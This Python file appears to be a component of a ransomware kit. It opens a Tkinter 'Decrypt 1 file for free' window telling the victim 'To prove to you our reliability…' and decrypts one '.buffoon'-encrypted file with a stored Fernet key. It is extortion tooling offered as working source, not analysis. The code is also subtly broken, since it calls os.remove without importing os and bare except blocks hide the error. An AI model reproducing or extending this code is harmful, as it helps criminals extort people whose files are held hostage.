from tkinter import * # GUI 
from tkinter.font import Font # Design some label
from cryptography.fernet import Fernet
from os import getlogin,rename
from os.path import expanduser,dirname,realpath,isfile
from sys import path
# Local import Constant
current = dirname(realpath(__file__))
current_dir = dirname(current)
path.append(current_dir)
# Import 
from const import *


class FreeDecrypt() : 


    def gui_free_file_decrypt(self) : 
        'Window for decrypt one file for free'
        self.app3 = Tk()
        self.app3.iconbitmap(self.ico_img_path)
        self.app3.title('Decrypt 1 file for free')
        self.app3.geometry('800x600')
        self.app3['bg'] = 'red4'
        self.app3.resizable(width=False,height=False)
        note = "To prove to you our reliability we allow you to decrypt one file for free !"
        font = Font(family='Courrier', size='14', underline=1,font='Helvetica 15 bold')
        Label(self.app3,font='Helvetica 15 bold',text=note, bg='red4').place(x=90,y=50)
        Button(self.app3, text='Decrypt One file for free', font=font, bg='red4', width=40,height=3, relief='sunken',command=self.free_file_decrypt).place(x=190,y=200)

        if self.check_free_file() == True : 
            free_file = open(PATH_FREE_FILE_DECRYPT).read()
            good_font = Font(self.app3, family='Courrier', size=13)
            message_good = Label(self.app3, font=good_font, text=f'Your file are decrypted \n{free_file}', bg='green')
            message_good.place(x=120, y=340)

        self.app3.mainloop()


    def check_free_file(self) -> bool : 
        'Check if we had already decrypt free file'
        if isfile(ALREADY_PATH) == True : 
            return True

    def free_file_decrypt(self): 
        'Decrypt the free file'
        try:
            with open(FREE_KEY_PATH,'rb') as f :
                key = f.read()
            self.free_cypher = Fernet(key)
            with open(PATH_FREE_FILE_DECRYPT,'r') as ff : 
                free_file = ff.read()
                free_file = str(free_file)
            with open(f'{free_file}.buffoon', "rb") as fin, open(free_file, "wb") as fout:
                while True:
                    block = fin.read(8000100)  
                    if not block:
                        break
                    output = self.free_cypher.decrypt(block)
                    print(f'decrypted block size {free_file}.buffoon :' + str(len(output)))  
                    fout.write(output)
        
            with open(ALREADY_PATH,'a') as fff : 
                fff.write('True')
            os.remove(f'{free_file}.buffoon')
            self.pop_up(free_file)
        except:pass
            
    def pop_up(self,free_file) :
        try: 
            good_font = Font(self.app3, family='Courrier', size=13)
            message_good = Label(self.app3, font=good_font, text=f'Your file are decrypted \n{free_file}', bg='green')
            message_good.place(x=120, y=340)
        except:pass

if __name__ == "__main__" : 

    fd = FreeDecrypt()
    fd.gui_free_file_decrypt()